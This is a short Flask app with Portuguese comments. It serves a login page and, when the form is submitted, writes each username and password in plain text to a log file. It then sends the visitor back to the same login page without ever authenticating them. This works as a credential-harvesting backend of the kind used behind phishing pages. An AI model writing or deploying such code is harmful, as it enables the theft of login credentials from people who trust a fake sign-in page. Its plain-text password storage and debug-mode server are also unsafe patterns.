from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# Caminho para o arquivo de log
log_file_path = os.path.join("logs", "login_data.txt")

# Rota para a página de login
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # Obtém os dados do formulário
        username = request.form.get("username")
        password = request.form.get("password")
        
        # Salva os dados no arquivo login_data.txt
        with open(log_file_path, "a") as log_file:
            log_file.write(f"Usuário: {username}, Senha: {password}\n")
        
        return redirect(url_for("login"))
    return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True)
